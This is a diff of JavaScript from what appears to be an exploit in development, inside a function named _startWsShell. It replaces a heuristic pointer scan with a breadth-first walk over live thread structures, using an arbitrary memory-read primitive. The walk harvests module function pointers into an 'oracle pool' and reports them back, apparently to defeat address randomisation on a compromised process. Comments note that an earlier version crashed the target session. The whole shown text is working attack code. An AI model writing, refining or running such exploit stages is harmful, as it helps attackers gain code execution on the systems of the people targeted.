@@ -6262,43 +6262,44 @@ function _startWsShell(){
               }
             }
           }catch(eW9){LB('a walk fault');}
-          /* (3) THE PTHREAD-STRUCT SCAN (the 0x88-band live structs) */
+          /* (3) THE PTHREAD-STRUCT WALK (session-170 lesson: the harvest's
+             * 0x88-band values include STALE structs - struct #2 killed
+             * the session. THE LIVE CHAIN instead: struct pthread's own
+             * link fields point at the OTHER live threads' structs -
+             * BFS from ptL (the backlink-proven live struct), reading
+             * only structs the live chain names. Each struct: scan all
+             * 0x880 bytes for module-band function pointers (startfunc/
+             * cleanup/wakeup - the worker threads were created by
+             * DIFFERENT MODULES) -> the oracle pool. */
           try{
-            var pts9=[];
-            if(typeof ptL!=='undefined'&&ptL>0n)pts9.push(ptL);
-            /* harvest the 0x88-band values from the stk band */
-            var pg9=(cfrL/0x4000n)*0x4000n;
-            var seenP9={};
-            function collectP9(start,len){
-              for(var offP=0;offP<len;offP+=0x1000){
-                var wsP;
-                try{wsP=S.absRead(start+BigInt(offP),0x1000);}catch(eP){return;}
-                for(var wiP=0;wiP<wsP.length;wiP++){
-                  var vP=wsP[wiP];
-                  if(vP>=0x880000000n&&vP<0x900000000n){
-                    var kP=vP.toString(16);
-                    if(!seenP9[kP]){seenP9[kP]=1;pts9.push(vP);}
-                  }
-                }
-              }
-            }
-            collectP9(pg9,0x8000);
-            for(var dP9=1;dP9<=4;dP9++){try{collectP9(pg9-BigInt(dP9*0x1000),0x1000);}catch(eP2){}}
-            LB('g pthread ptrs n='+pts9.length);
-            reply.ptPtrs=pts9.slice(0,12).map(function(p){return '0x'+p.toString(16);});
-            /* scan each struct (0x880 bytes - LIVE, safe) + the stack page below */
-            for(var pi9=0;pi9<pts9.length&&pi9<8;pi9++){
-              var P9=pts9[pi9];
+            var scanned9={},queue9=[],qq9=0;
+            if(typeof ptL!=='undefined'&&ptL>0n)queue9.push(ptL);
+            var ptLinks=[];
+            while(qq9<queue9.length&&qq9<10){
+              var P9=queue9[qq9++];
+              var k9=P9.toString(16);
+              if(scanned9[k9])continue;
+              scanned9[k9]=1;
               try{
                 var st9=S.absRead(P9,0x880);
-                for(var fi9=0;fi9<st9.length;fi9++)addF(st9[fi9]);
-                var below=S.absRead(P9-0x1000n,0x1000);
-                for(var fi2=0;fi2<below.length;fi2++)addF(below[fi2]);
-                LB('h struct 0x'+P9.toString(16)+' scanned');
+                for(var fi9=0;fi9<st9.length;fi9++){
+                  var v9q=st9[fi9];
+                  /* the live links: 0x88-band pointers -> queue them */
+                  if(v9q>=0x880000000n&&v9q<0x900000000n&&queue9.length<40){
+                    var kk9=v9q.toString(16);
+                    if(!scanned9[kk9])queue9.push(v9q);
+                  }
+                  /* the module-band function pointers -> the pool */
+                  addF(v9q);
+                }
+                ptLinks.push('0x'+P9.toString(16));
+                LB('h struct 0x'+P9.toString(16)+' scanned q='+queue9.length);
               }catch(eS9){LB('h struct 0x'+P9.toString(16)+' read fail');}
             }
-            LB('i foreign pool n='+foreign9.length);
-          }catch(eP9t){LB('g ptscan fault');}
+            reply.ptScanned=ptLinks;
+            LB('i structs='+ptLinks.length+' foreign pool n='+foreign9.length);
+          }catch(eP9t){LB('g ptwalk fault');}
+          
           /* (4) the general harvest (oracle-only) */
           try{
             var seenH9={};
